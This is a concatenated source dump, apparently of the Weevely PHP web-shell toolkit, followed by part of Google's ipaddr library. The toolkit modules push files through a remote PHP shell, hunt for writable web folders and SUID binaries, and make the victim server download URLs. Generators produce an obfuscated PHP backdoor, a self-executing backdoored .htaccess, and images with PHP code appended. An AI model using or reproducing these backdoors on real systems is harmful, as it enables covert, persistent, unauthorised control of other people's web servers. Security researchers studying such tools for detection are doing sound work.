        self.vectors.add_vector('file_put_contents', 'shell.php', [ "file_put_contents('$rpath', base64_decode($_POST['$post_field']), FILE_APPEND);", "-post", "{\'$post_field\' : \'$data\' }" ])
        self.vectors.add_vector('fwrite', 'shell.php', [ '$h = fopen("$rpath", "a+"); fwrite($h, base64_decode($_POST["$post_field"])); fclose($h);', "-post", "{\'$post_field\' : \'$data\' }" ])
    
        self.support_vectors.add_vector("rm", 'file.rm', "$rpath -recursive".split(' '))
        self.support_vectors.add_vector("check_exists", 'file.check', "$rpath exists".split(' '))
        self.support_vectors.add_vector('md5', 'file.check', '$rpath md5'.split(' '))
        self.support_vectors.add_vector('clear', 'shell.php', "file_put_contents('$rpath', '');" )
        
    
    def _set_args(self):
        self.argparser.add_argument('lpath')
        self.argparser.add_argument('rpath')
        self.argparser.add_argument('-chunksize', type=int, default=1024)
        self.argparser.add_argument('-content', help=SUPPRESS)
        self.argparser.add_argument('-vector', choices = self.vectors.keys()),
        self.argparser.add_argument('-force', action='store_true')

    def _load_local_file(self):

        if not self.args['content']:
            try:
                local_file = open(self.args['lpath'], 'r')
            except Exception, e:
                raise ProbeException(self.name,  '\'%s\' %s' % (self.args['lpath'], WARN_NO_SUCH_FILE))

            self.args['content'] = local_file.read()
            local_file.close()
        
        
        self.args['content_md5'] = md5(self.args['content']).hexdigest()
        self.args['content_chunks'] = self.__chunkify(self.args['content'], self.args['chunksize'])
        self.args['post_field'] = ''.join([choice('abcdefghijklmnopqrstuvwxyz') for i in xrange(4)])

    def _check_remote_file(self):     
        
        if self.support_vectors.get('check_exists').execute({'rpath' : self.args['rpath']}):
            if not self.args['force']:
                raise ProbeException(self.name, '%s. Overwrite \'%s\' using -force option.' % (WARN_FILE_EXISTS, self.args['rpath']))
            else:
                self.support_vectors.get('clear').execute({'rpath' : self.args['rpath']})
                
    def _prepare(self):

        self._load_local_file()
        self._check_remote_file()
        
    def _execute_vector(self):       

        self._result = False

        i=1
        for chunk in self.args['content_chunks']:
            
            formatted_args = { 'rpath' : self.args['rpath'], 'post_field' : self.args['post_field'], 'data' : chunk }
            self.current_vector.execute( formatted_args)  
            
            i+=1

    def _verify_vector_execution(self):
    
        if self.support_vectors.get('check_exists').execute({'rpath' : self.args['rpath']}):
            if self.support_vectors.get('md5').execute({'rpath' : self.args['rpath']}) == self.args['content_md5']:
                self._result = True
                raise ProbeSucceed(self.name, 'File uploaded')
            else:
                self.mprint('\'%s\' %s' % (self.args['rpath'], WARN_MD5_MISMATCH))

    def _verify(self):
        if not self.support_vectors.get('check_exists').execute({'rpath' : self.args['rpath']}):
            raise ProbeException(self.name, '\'%s\' %s' % (self.args['rpath'], WARN_UPLOAD_FAIL))

    def __chunkify(self, file_content, chunksize):

        content_len = len(file_content)
        if content_len > chunksize:
            content_chunks = b64_chunks(file_content, chunksize)
        else:
            content_chunks = [ b64encode(file_content) ]

        numchunks = len(content_chunks)
        if numchunks > 20:
            self.mprint('Warning: uploading %iB in %i chunks of %sB. Increase chunk size with option \'-chunksize\' to reduce upload time' % (content_len, numchunks, self.args['chunksize']) )

        return content_chunks



########NEW FILE########
__FILENAME__ = upload2web
'''
Created on 23/set/2011

@author: norby
'''
from core.module import Module
from modules.file.upload import Upload
from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
from core.http.cmdrequest import CmdRequest, NoDataException
from core.argparse import ArgumentParser
from core.argparse import SUPPRESS
import os
from random import choice
from string import ascii_lowercase
from urlparse import urlsplit, urlunsplit


WARN_WEBROOT_INFO = 'Error getting web environment information'
WARN_NOT_WEBROOT_SUBFOLDER = "is not a webroot subdirectory"
WARN_NOT_FOUND = 'Path not found'
WARN_WRITABLE_DIR_NOT_FOUND = "Writable web directory not found"

class WebEnv:
    
    def __init__(self, support_vectors, url):
        
        self.support_vectors = support_vectors
        self.name = 'webenv'
        
        script_folder = self.support_vectors.get('script_folder').execute()
        script_url_splitted = urlsplit(url)
        script_url_path_folder, script_url_path_filename = os.path.split(script_url_splitted.path)
        
        url_folder_pieces = script_url_path_folder.split(os.sep)
        folder_pieces = script_folder.split(os.sep)

        for pieceurl, piecefolder in zip(reversed(url_folder_pieces), reversed(folder_pieces)):
            if pieceurl == piecefolder:
                folder_pieces.pop()
                url_folder_pieces.pop()
            else:
                break
            
        base_url_path_folder = os.sep.join(url_folder_pieces)
        self.base_folder_url = urlunsplit(script_url_splitted[:2] + ( base_url_path_folder, ) + script_url_splitted[3:])
        self.base_folder_path = os.sep.join(folder_pieces)
        
        if not self.base_folder_url or not self.base_folder_path:
            raise ProbeException(self.name, WARN_WEBROOT_INFO)
        
    def folder_map(self, relative_path_folder = '.'):
        
        absolute_path =  self.support_vectors.get('normalize').execute({ 'path' : relative_path_folder })
        
        if not absolute_path:
            raise ProbeException(self.name, '\'%s\' %s' % (relative_path_folder, WARN_NOT_FOUND))
        
        if not absolute_path.startswith(self.base_folder_path.rstrip('/')):
            raise ProbeException(self.name, '\'%s\' not in \'%s\': %s' % (absolute_path, self.base_folder_path.rstrip('/'), WARN_NOT_WEBROOT_SUBFOLDER) ) 
            
        relative_to_webroot_path = absolute_path.replace(self.base_folder_path,'')
        
        url_folder = '%s/%s' % ( self.base_folder_url.rstrip('/'), relative_to_webroot_path.lstrip('/') )
        
        return absolute_path, url_folder
    
    def file_map(self, relative_path_file):
        
        relative_path_folder, filename = os.path.split(relative_path_file)
        if not relative_path_folder: relative_path_folder = './'
        
        
        absolute_path_folder, url_folder = self.folder_map(relative_path_folder)
    
        absolute_path_file = os.path.join(absolute_path_folder, filename)
        url_file = os.path.join(url_folder, filename)
        
        return absolute_path_file, url_file
    

class Upload2web(Upload):
    '''Upload binary/ascii file into remote web folders and guess corresponding url'''


    def _set_args(self):
        
        self.argparser.add_argument('lpath')
        self.argparser.add_argument('rpath', help='Optional, upload as rpath', nargs='?')
        
        self.argparser.add_argument('-startpath', help='Upload in first writable subdirectory', metavar='STARTPATH', default='.')
        self.argparser.add_argument('-chunksize', type=int, default=1024)
        self.argparser.add_argument('-content', help=SUPPRESS)
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-force', action='store_true')


    def _set_vectors(self):
        Upload._set_vectors(self)
        
        self.support_vectors.add_vector('find_writable_dirs', 'find.perms', '-type d -writable $path'.split(' '))
        self.support_vectors.add_vector('document_root', 'system.info', 'document_root' )
        self.support_vectors.add_vector('normalize', 'shell.php', 'print(realpath("$path"));')
        self.support_vectors.add_vector('script_folder', 'shell.php', 'print(dirname(__FILE__));')

    
    def _prepare(self):

        Upload._load_local_file(self)
        
        webenv = WebEnv(self.support_vectors, self.modhandler.url)
        
        if self.args['rpath']:
            # Check if remote file is actually in web root
            self.args['rpath'], self.args['url'] = webenv.file_map(self.args['rpath'])
        else:
            
            # Extract filename
            filename = self.args['lpath'].split('/')[-1]
            
            # Check if starting folder is actually in web root
            try:
                absolute_path_folder, url_folder = webenv.folder_map(self.args['startpath'])
            except ProbeException, e:
                # If default research fails, retry from web root base folder
                if self.args['startpath'] != '.':
                    raise
                else:
                    try:
                        absolute_path_folder, url_folder = webenv.folder_map(webenv.base_folder_path)
                    except ProbeException, e2:       
                        raise e
            
            # Start find in selected folder
            writable_subdirs = self.support_vectors.get('find_writable_dirs').execute({'path' : absolute_path_folder})

            if not writable_subdirs:
                raise ProbeException(self.name, WARN_WRITABLE_DIR_NOT_FOUND)
                
            writable_folder, writable_folder_url = webenv.folder_map(writable_subdirs[0])
            
            self.args['rpath'] = os.path.join(writable_folder, filename)
            
            self.args['url'] = os.path.join(writable_folder_url, filename)        
                
        
                
        Upload._check_remote_file(self)                
        
    
    def _stringify_result(self):
        if self._result:
            self._result = [ self.args['rpath'], self.args['url'] ]
        else:
            self._result = [ '', '' ]
        
        return Upload._stringify_result(self)
    

########NEW FILE########
__FILENAME__ = webdownload

from core.moduleguess import ModuleGuess
from core.moduleexception import ProbeException, ProbeSucceed

WARN_DOWNLOAD_OK = 'Downloaded succeed'

class Webdownload(ModuleGuess):
    '''Download web URL to remote filesystem'''

    def _set_vectors(self):
        
        self.vectors.add_vector(name='putcontent', interpreter='shell.php', payloads = [ 'file_put_contents("$rpath", file_get_contents("$url"));' ])
        self.vectors.add_vector(name='wget', interpreter='shell.sh', payloads = [ 'wget $url -O $rpath' ])
        self.vectors.add_vector(name='curl', interpreter='shell.sh', payloads = [ 'curl -o $rpath $url' ])
        
        self.support_vectors.add_vector(name='check_download', interpreter='file.check', payloads = [ '$rpath', 'exists' ])
                
    def _set_args(self):
        self.argparser.add_argument('url')
        self.argparser.add_argument('rpath')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        
    
    def  _verify_vector_execution(self):
   
       # Verify downloaded file. Save vector return value in self._result and eventually raise 
       # ProbeException to stop module execution and print error message.

       self._result = self.support_vectors.get('check_download').execute({ 'rpath' : self.args['rpath'] })
       
       if self._result == True:
           raise ProbeSucceed(self.name, WARN_DOWNLOAD_OK)
       
########NEW FILE########
__FILENAME__ = name


from core.moduleguess import ModuleGuess
from core.moduleexception import ModuleException, ProbeException
from core.argparse import ArgumentParser


class Name(ModuleGuess):
    '''Find files with matching name'''


    def _set_vectors(self):
        self.vectors.add_vector('php_recursive', 'shell.php', """swp('$rpath','$mode','$string',$recursion);
function ckdir($df, $f) { return ($f!='.')&&($f!='..')&&@is_dir($df); }
function match($f, $s, $m) { return preg_match(str_replace("%%STRING%%",$s,$m),$f); }
function swp($d, $m, $s,$r){ $h = @opendir($d);
while ($f = readdir($h)) { $df=$d.'/'.$f; if(($f!='.')&&($f!='..')&&match($f,$s,$m)) print($df."\n"); if(@ckdir($df,$f)&&$r) @swp($df, $m, $s, $r); }
if($h) { @closedir($h); } }""")
        self.vectors.add_vector("find" , 'shell.sh', "find $rpath $recursion $mode \"$string\" 2>/dev/null")
    
    def _set_args(self):
        self.argparser.add_argument('string', help='String to match')
        self.argparser.add_argument('-rpath', help='Remote starting path', default ='.', nargs='?')
        self.argparser.add_argument('-equal', help='Match if name is exactly equal (default: match if contains)', action='store_true', default=False)
        self.argparser.add_argument('-case', help='Case sensitive match (default: insenstive)', action='store_true', default=False)
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-no-recursion', help='Do not descend into subfolders', action='store_true', default=False)


    def _prepare_vector(self):
        
        self.formatted_args = { 'rpath' : self.args['rpath'] }
            
        if self.current_vector.name == 'find':

            if not self.args['equal']:
                self.formatted_args['string'] = '*%s*' % self.args['string']
            else:
                self.formatted_args['string'] = self.args['string']
            
            if not self.args['case']:
                self.formatted_args['mode'] = '-iname'
            else:
                self.formatted_args['mode'] = '-name'
                
            if self.args['no_recursion']:
                self.formatted_args['recursion'] = '-maxdepth 1'
            else:
                self.formatted_args['recursion'] = ''

        elif self.current_vector.name == 'php_recursive':
            
            self.formatted_args['string'] = self.args['string']

            if not self.args['equal']:
                self.formatted_args['mode'] = '/%%STRING%%/'
            else:
                self.formatted_args['mode'] = '/^%%STRING%%$/'
                
            if not self.args['case']:
                self.formatted_args['mode'] += 'i'
                
            
            if self.args['no_recursion']:
                self.formatted_args['recursion'] = 'False'
            else:
                self.formatted_args['recursion'] = 'True'
                

            
    def _stringify_result(self):
        
        # Listify output, to advantage other modules 
        self._output = self._result
        self._result = self._result.split('\n') if self._result else []

########NEW FILE########
__FILENAME__ = perms


from core.moduleguess import ModuleGuess
from core.moduleexception import ModuleException
from core.argparse import ArgumentParser


class Perms(ModuleGuess):
    '''Find files with write, read, execute permissions'''


    def _set_vectors(self):
        self.vectors.add_vector('php_recursive', 'shell.php', """$fdir='$rpath';$ftype='$type';$fattr='$attr';$fqty='$first';$recurs=$recursion;
swp($fdir, $fdir,$ftype,$fattr,$fqty,$recurs); 
function ckprint($df,$t,$a) { if(cktp($df,$t)&&@ckattr($df,$a)) { print($df."\\n"); return True;}   }
function ckattr($df, $a) { $w=strstr($a,"w");$r=strstr($a,"r");$x=strstr($a,"x"); return ($a=='')||(!$w||is_writable($df))&&(!$r||is_readable($df))&&(!$x||is_executable($df)); }
function cktp($df, $t) { return ($t==''||($t=='f'&&@is_file($df))||($t=='d'&&@is_dir($df))); }
function swp($fdir, $d, $t, $a, $q,$r){ 
if($d==$fdir && ckprint($d,$t,$a) && ($q!="")) return; 
$h=@opendir($d); while ($f = @readdir($h)) { if(substr($fdir,0,1)=='/') { $df='/'; } else { $df=''; }
$df.=join('/', array(trim($d, '/'), trim($f, '/')));
if(($f!='.')&&($f!='..')&&ckprint($df,$t,$a) && ($q!="")) return;
if(($f!='.')&&($f!='..')&&cktp($df,'d')&&$r){@swp($fdir, $df, $t, $a, $q,$r);}
} if($h) { closedir($h); } }""")
        self.vectors.add_vector("find" , 'shell.sh', "find $rpath $recursion $type $attr $first 2>/dev/null")
    
    def _set_args(self):
        self.argparser.add_argument('rpath', help='Remote starting path', default ='.', nargs='?')
        self.argparser.add_argument('-first', help='Quit after first match', action='store_true')
        self.argparser.add_argument('-type', help='File type',  choices = ['f','d'])
        self.argparser.add_argument('-writable', help='Match writable files', action='store_true')
        self.argparser.add_argument('-readable', help='Matches redable files', action='store_true')
        self.argparser.add_argument('-executable', help='Matches executable files', action='store_true')
        self.argparser.add_argument('-vector', choices = self.vectors.keys())
        self.argparser.add_argument('-no-recursion', help='Do not descend into subfolders', action='store_true', default=False)


    def _prepare_vector(self):
        
        self.formatted_args = { 'rpath' : self.args['rpath'] }
        
        if self.current_vector.name == 'find':
            
            # Set first
            self.formatted_args['first'] = '-print -quit' if self.args['first'] else ''
            
            # Set type
            type = self.args['type'] if self.args['type'] else ''
            if type:
                type = '-type %s' % type
            self.formatted_args['type'] = type
                    
            # Set attr
            self.formatted_args['attr'] = '-writable' if self.args['writable'] else ''
            self.formatted_args['attr'] += ' -readable' if self.args['readable'] else ''
            self.formatted_args['attr'] += ' -executable' if self.args['executable'] else ''
            
            # Set recursion
            self.formatted_args['recursion'] =  ' -maxdepth 1 ' if self.args['no_recursion'] else ''

        else:
            # Vector.name = php_find
            # Set first
            self.formatted_args['first'] = '1' if self.args['first'] else ''
            
            # Set type
            self.formatted_args['type']  = self.args['type'] if self.args['type'] else ''
            
            # Set attr
            self.formatted_args['attr'] = 'w' if self.args['writable'] else ''
            self.formatted_args['attr'] += 'r' if self.args['readable'] else ''
            self.formatted_args['attr'] += 'x' if self.args['executable'] else ''
            
            # Set recursion
            self.formatted_args['recursion'] = not self.args['no_recursion']
            
            
    def _stringify_result(self):
        
        # Listify output, to advantage other modules 
        self._output = self._result
        self._result = self._result.split('\n') if self._result else []

########NEW FILE########
__FILENAME__ = suidsgid
from core.module import Module
from core.argparse import ArgumentParser


class Suidsgid(Module):
    '''Find files with superuser flags'''
    def _set_vectors(self):
        self.support_vectors.add_vector( "find" , 'shell.sh', "find $rpath $perm 2>/dev/null")
    
        
    def _set_args(self):
        self.argparser.add_argument('-rpath', help='Remote starting path', default='/')
        self.argparser.add_argument('-suid', help='Find only suid', action='store_true')
        self.argparser.add_argument('-sgid', help='Find only sgid', action='store_true')
        
    
    def _probe(self):
        
        if self.args['suid']:
            self.args['perm'] = '-perm -04000'
        elif self.args['sgid']:
            self.args['perm'] = '-perm -02000'
        else:
            self.args['perm'] = '-perm -04000 -o -perm -02000'
            
        self._result = self.support_vectors.get('find').execute(self.args)
        
    def _stringify_result(self):
        
        # Listify output, to advantage other modules 
        self._output = self._result
        self._result = self._result.split('\n') if self._result else []
########NEW FILE########
__FILENAME__ = htaccess
'''
Created on 22/ago/2011

@author: norby
'''

from modules.generate.php import Php as Phpgenerator
from core.backdoor import Backdoor

htaccess_template = '''<Files ~ "^\.ht">
    Order allow,deny
    Allow from all
</Files>

AddType application/x-httpd-php .htaccess
# %s #
'''

class Htaccess(Phpgenerator):
    """Generate backdoored .htaccess"""

    def _set_args(self):
        self.argparser.add_argument('pass', help='Password')
        self.argparser.add_argument('lpath', help='Path of generated backdoor', default= '.htaccess', nargs='?')

    def _prepare(self):
        
        self.args['encoded_backdoor'] = htaccess_template % Backdoor(self.args['pass']).backdoor.replace('\n', ' ')

        
########NEW FILE########
__FILENAME__ = img
'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module
from core.moduleexception import ModuleException, ProbeException
from core.backdoor import Backdoor
from os import path, mkdir
from shutil import copy
from tempfile import mkstemp
from commands import getstatusoutput

htaccess_template = '''AddType application/x-httpd-php .%s
'''

WARN_IMG_NOT_FOUND = 'Input image not found'
WARN_DIR_CREAT = 'Making folder'
WARN_WRITING_DATA = 'Writing data'
WARN_COPY_FAIL = 'Copy fail'
WARN_PHP = 'Can\'t execute PHP interpreter'
WARN_PHP_TEST = 'Error executing php code appended at image. Retry with simpler image or blank gif'

class Img(Module):
    """Backdoor existing image and create related .htaccess"""

    def _set_args(self):
        self.argparser.add_argument('pass', help='Password')
        self.argparser.add_argument('img', help='Input image path')
        self.argparser.add_argument('ldir', help='Dir where to save modified image and .htaccess', default= 'bd_output', nargs='?')

    def __append_bin_data(self, pathfrom, pathto, data):
        
        try:
            copy(pathfrom, pathto)
        except Exception, e:
            raise ModuleException(self.name, "%s %s" % (WARN_COPY_FAIL, str(e)))
        
        try:
            open(pathto, "ab").write(data)
        except Exception, e:
            raise ModuleException(self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
            

    def __php_test_version(self):
        status, output = getstatusoutput('php -v')
        if status == 0 and output: return True
        return False

    def __php_test_backdoor(self, path):
        status, output = getstatusoutput('php %s' % path)
        if status == 0 and 'TEST OK' in output: return True
        return False

    def _prepare(self):
        
        if not path.isfile(self.args['img']):
            raise ModuleException(self.name, "'%s' %s" % (self.args['img'], WARN_IMG_NOT_FOUND))
        
        if not path.isdir(self.args['ldir']):
            try:
                mkdir(self.args['ldir'])
            except Exception, e:
                raise ModuleException(self.name, "%s %s" % (WARN_DIR_CREAT, str(e)))
        
        temp_file, temp_path = mkstemp()
        
        if not self.__php_test_version():
            raise ProbeException(self.name, WARN_PHP)
        self.__append_bin_data(self.args['img'], temp_path, '<?php print(str_replace("#","","T#E#S#T# #O#K#")); ?>')
        if not self.__php_test_backdoor(temp_path):
            raise ProbeException(self.name, '\'%s\' %s' % (self.args['img'], WARN_PHP_TEST))


    def _probe(self):
        
        filepath, filename = path.split(self.args['img'])
        fileext = filename.split('.')[-1]
        
        path_img2 = path.join(self.args['ldir'], filename)
        
        oneline_backdoor = Backdoor(self.args['pass']).backdoor.replace('\n',' ')
        self.__append_bin_data(self.args['img'], path_img2, oneline_backdoor)

        path_htaccess = path.join(self.args['ldir'], '.htaccess')        
        try:
            open(path_htaccess, "w+").write(htaccess_template % fileext)
        except Exception, e:
            raise ModuleException(self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
                    
        self.mprint("Backdoor files '%s' and '%s' created with password '%s'" % (path_img2, path_htaccess, self.args['pass']))
                    
        self._result =  [ path_img2, path_htaccess ]
        
    def _stringify_result(self):
        pass      

########NEW FILE########
__FILENAME__ = php
'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module
from core.moduleexception import ModuleException
from core.backdoor import Backdoor


WARN_WRITING_DATA = 'Writing data'

class Php(Module):
    """Generate obfuscated PHP backdoor"""

    def _set_args(self):
        self.argparser.add_argument('pass', help='Password')
        self.argparser.add_argument('lpath', help='Path of generated backdoor', default= 'weevely.php', nargs='?')

    def _prepare(self):
        self.args['encoded_backdoor'] = Backdoor(self.args['pass']).backdoor

    def _probe(self):
        
        try:
            file( self.args['lpath'], 'wt' ).write( self.args['encoded_backdoor'] )
        except Exception, e:
            raise ModuleException(self.name, "%s %s" % (WARN_WRITING_DATA, str(e)))
        else:
            self.mprint("Backdoor file '%s' created with password '%s'" % (self.args['lpath'], self.args['pass']))
        
        self._result =  self.args['lpath']
        
    def _stringify_result(self):
        pass
            
                    
        
########NEW FILE########
__FILENAME__ = ipaddr
#!/usr/bin/python
#
# Copyright 2007 Google Inc.
#  Licensed to PSF under a Contributor Agreement.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
# implied. See the License for the specific language governing
# permissions and limitations under the License.

"""A fast, lightweight IPv4/IPv6 manipulation library in Python.

This library is used to create/poke/manipulate IPv4 and IPv6 addresses
and networks.

"""

__version__ = 'trunk'

import struct

IPV4LENGTH = 32
IPV6LENGTH = 128


class AddressValueError(ValueError):
    """A Value Error related to the address."""


class NetmaskValueError(ValueError):
    """A Value Error related to the netmask."""


def IPAddress(address, version=None):
    """Take an IP string/int and return an object of the correct type.

    Args:
        address: A string or integer, the IP address.  Either IPv4 or
          IPv6 addresses may be supplied; integers less than 2**32 will
          be considered to be IPv4 by default.
        version: An Integer, 4 or 6. If set, don't try to automatically
          determine what the IP address type is. important for things
          like IPAddress(1), which could be IPv4, '0.0.0.1',  or IPv6,
          '::1'.

    Returns:
        An IPv4Address or IPv6Address object.

    Raises:
        ValueError: if the string passed isn't either a v4 or a v6
          address.

    """
    if version:
        if version == 4:
            return IPv4Address(address)
        elif version == 6:
            return IPv6Address(address)

    try:
        return IPv4Address(address)
    except (AddressValueError, NetmaskValueError):
        pass

    try:
        return IPv6Address(address)
    except (AddressValueError, NetmaskValueError):
        pass

    raise ValueError('%r does not appear to be an IPv4 or IPv6 address' %
                     address)


def IPNetwork(address, version=None, strict=False):
    """Take an IP string/int and return an object of the correct type.

    Args:
        address: A string or integer, the IP address.  Either IPv4 or
          IPv6 addresses may be supplied; integers less than 2**32 will
          be considered to be IPv4 by default.
        version: An Integer, if set, don't try to automatically
          determine what the IP address type is. important for things
          like IPNetwork(1), which could be IPv4, '0.0.0.1/32', or IPv6,
          '::1/128'.

    Returns:
        An IPv4Network or IPv6Network object.

    Raises:
        ValueError: if the string passed isn't either a v4 or a v6
          address. Or if a strict network was requested and a strict
          network wasn't given.

    """
    if version:
        if version == 4:
            return IPv4Network(address, strict)
        elif version == 6:
            return IPv6Network(address, strict)

    try:
        return IPv4Network(address, strict)
    except (AddressValueError, NetmaskValueError):
        pass

    try:
        return IPv6Network(address, strict)
    except (AddressValueError, NetmaskValueError):
        pass

    raise ValueError('%r does not appear to be an IPv4 or IPv6 network' %
                     address)


def v4_int_to_packed(address):
    """The binary representation of this address.

    Args:
        address: An integer representation of an IPv4 IP address.

    Returns:
        The binary representation of this address.

    Raises:
        ValueError: If the integer is too large to be an IPv4 IP
          address.
    """
    if address > _BaseV4._ALL_ONES:
        raise ValueError('Address too large for IPv4')
    return Bytes(struct.pack('!I', address))


def v6_int_to_packed(address):
    """The binary representation of this address.

    Args:
        address: An integer representation of an IPv4 IP address.

    Returns:
        The binary representation of this address.
    """
    return Bytes(struct.pack('!QQ', address >> 64, address & (2**64 - 1)))


def _find_address_range(addresses):
    """Find a sequence of addresses.

    Args:
        addresses: a list of IPv4 or IPv6 addresses.

    Returns:
        A tuple containing the first and last IP addresses in the sequence.

    """
    first = last = addresses[0]
    for ip in addresses[1:]:
        if ip._ip == last._ip + 1:
            last = ip
        else:
            break
    return (first, last)

def _get_prefix_length(number1, number2, bits):
    """Get the number of leading bits that are same for two numbers.

    Args:
        number1: an integer.
        number2: another integer.
        bits: the maximum number of bits to compare.

    Returns:
        The number of leading bits that are the same for two numbers.

    """
    for i in range(bits):
        if number1 >> i == number2 >> i:
            return bits - i
    return 0

def _count_righthand_zero_bits(number, bits):
    """Count the number of zero bits on the right hand side.

    Args:
        number: an integer.
        bits: maximum number of bits to count.

    Returns:
        The number of zero bits on the right hand side of the number.

    """
    if number == 0:
        return bits
    for i in range(bits):
        if (number >> i) % 2:
            return i

def summarize_address_range(first, last):
    """Summarize a network range given the first and last IP addresses.

    Example:
        >>> summarize_address_range(IPv4Address('1.1.1.0'),
            IPv4Address('1.1.1.130'))
        [IPv4Network('1.1.1.0/25'), IPv4Network('1.1.1.128/31'),
        IPv4Network('1.1.1.130/32')]

    Args:
        first: the first IPv4Address or IPv6Address in the range.
        last: the last IPv4Address or IPv6Address in the range.

    Returns:
        The address range collapsed to a list of IPv4Network's or
        IPv6Network's.

    Raise:
        TypeError:
            If the first and last objects are not IP addresses.
            If the first and last objects are not the same version.
        ValueError:
            If the last object is not greater than the first.
            If the version is not 4 or 6.

    """
    if not (isinstance(first, _BaseIP) and isinstance(last, _BaseIP)):
        raise TypeError('first and last must be IP addresses, not networks')
    if first.version != last.version:
        raise TypeError("%s and %s are not of the same version" % (
                str(first), str(last)))
    if first > last:
        raise ValueError('last IP address must be greater than first')

    networks = []

    if first.version == 4:
        ip = IPv4Network
    elif first.version == 6:
        ip = IPv6Network
    else:
        raise ValueError('unknown IP version')

    ip_bits = first._max_prefixlen
    first_int = first._ip
    last_int = last._ip
    while first_int <= last_int:
        nbits = _count_righthand_zero_bits(first_int, ip_bits)
        current = None
        while nbits >= 0:
            addend = 2**nbits - 1
            current = first_int + addend
            nbits -= 1
            if current <= last_int:
                break
        prefix = _get_prefix_length(first_int, current, ip_bits)
        net = ip('%s/%d' % (str(first), prefix))
        networks.append(net)
        if current == ip._ALL_ONES:
            break
        first_int = current + 1
        first = IPAddress(first_int, version=first._version)
    return networks

def _collapse_address_list_recursive(addresses):
    """Loops through the addresses, collapsing concurrent netblocks.

    Example:

        ip1 = IPv4Network('1.1.0.0/24')
        ip2 = IPv4Network('1.1.1.0/24')
        ip3 = IPv4Network('1.1.2.0/24')
        ip4 = IPv4Network('1.1.3.0/24')
        ip5 = IPv4Network('1.1.4.0/24')
        ip6 = IPv4Network('1.1.0.1/22')

        _collapse_address_list_recursive([ip1, ip2, ip3, ip4, ip5, ip6]) ->
          [IPv4Network('1.1.0.0/22'), IPv4Network('1.1.4.0/24')]

        This shouldn't be called directly; it is called via
          collapse_address_list([]).

    Args:
        addresses: A list of IPv4Network's or IPv6Network's

    Returns:
        A list of IPv4Network's or IPv6Network's depending on what we were
        passed.

    """
    ret_array = []
    optimized = False

    for cur_addr in addresses:
        if not ret_array:
            ret_array.append(cur_addr)
            continue
        if cur_addr in ret_array[-1]:
            optimized = True
        elif cur_addr == ret_array[-1].supernet().subnet()[1]:
            ret_array.append(ret_array.pop().supernet())
            optimized = True
        else:
            ret_array.append(cur_addr)

    if optimized:
        return _collapse_address_list_recursive(ret_array)

    return ret_array


def collapse_address_list(addresses):
    """Collapse a list of IP objects.

    Example:
        collapse_address_list([IPv4('1.1.0.0/24'), IPv4('1.1.1.0/24')]) ->
          [IPv4('1.1.0.0/23')]

    Args:
        addresses: A list of IPv4Network or IPv6Network objects.

    Returns:
        A list of IPv4Network or IPv6Network objects depending on what we
        were passed.

    Raises:
        TypeError: If passed a list of mixed version objects.

    """
    i = 0
    addrs = []
    ips = []
    nets = []

    # split IP addresses and networks
    for ip in addresses:
        if isinstance(ip, _BaseIP):
            if ips and ips[-1]._version != ip._version:
                raise TypeError("%s and %s are not of the same version" % (
                        str(ip), str(ips[-1])))
            ips.append(ip)
        elif ip._prefixlen == ip._max_prefixlen:
            if ips and ips[-1]._version != ip._version:
                raise TypeError("%s and %s are not of the same version" % (
                        str(ip), str(ips[-1])))
            ips.append(ip.ip)
        else:
            if nets and nets[-1]._version != ip._version:
                raise TypeError("%s and %s are not of the same version" % (
                        str(ip), str(ips[-1])))
            nets.append(ip)

    # sort and dedup
    ips = sorted(set(ips))
    nets = sorted(set(nets))

    while i < len(ips):
        (first, last) = _find_address_range(ips[i:])
        i = ips.index(last) + 1
        addrs.extend(summarize_address_range(first, last))

    return _collapse_address_list_recursive(sorted(
        addrs + nets, key=_BaseNet._get_networks_key))

# backwards compatibility
CollapseAddrList = collapse_address_list

# We need to distinguish between the string and packed-bytes representations
# of an IP address.  For example, b'0::1' is the IPv4 address 48.58.58.49,
# while '0::1' is an IPv6 address.
#
# In Python 3, the native 'bytes' type already provides this functionality,
# so we use it directly.  For earlier implementations where bytes is not a
# distinct type, we create a subclass of str to serve as a tag.
#
# Usage example (Python 2):
#   ip = ipaddr.IPAddress(ipaddr.Bytes('xxxx'))
#
# Usage example (Python 3):
#   ip = ipaddr.IPAddress(b'xxxx')
try:
    if bytes is str:
        raise TypeError("bytes is not a distinct type")
    Bytes = bytes
except (NameError, TypeError):
    class Bytes(str):
        def __repr__(self):
            return 'Bytes(%s)' % str.__repr__(self)

def get_mixed_type_key(obj):
    """Return a key suitable for sorting between networks and addresses.

    Address and Network objects are not sortable by default; they're
    fundamentally different so the expression

        IPv4Address('1.1.1.1') <= IPv4Network('1.1.1.1/24')

    doesn't make any sense.  There are some times however, where you may wish
    to have ipaddr sort these for you anyway. If you need to do this, you
    can use this function as the key= argument to sorted().

    Args:
      obj: either a Network or Address object.
    Returns:
      appropriate key.

    """
    if isinstance(obj, _BaseNet):
        return obj._get_networks_key()
    elif isinstance(obj, _BaseIP):
        return obj._get_address_key()
    return NotImplemented

class _IPAddrBase(object):

    """The mother class."""

    def __index__(self):
        return self._ip

    def __int__(self):
        return self._ip

    def __hex__(self):
        return hex(self._ip)

    @property
    def exploded(self):
        """Return the longhand version of the IP address as a string."""
        return self._explode_shorthand_ip_string()

    @property
    def compressed(self):
        """Return the shorthand version of the IP address as a string."""
        return str(self)


class _BaseIP(_IPAddrBase):

    """A generic IP object.

    This IP class contains the version independent methods which are
    used by single IP addresses.

    """

    def __eq__(self, other):
        try:
            return (self._ip == other._ip
                    and self._version == other._version)
        except AttributeError:
            return NotImplemented

    def __ne__(self, other):
        eq = self.__eq__(other)
        if eq is NotImplemented:
            return NotImplemented
        return not eq

    def __le__(self, other):
        gt = self.__gt__(other)
        if gt is NotImplemented:
            return NotImplemented
        return not gt

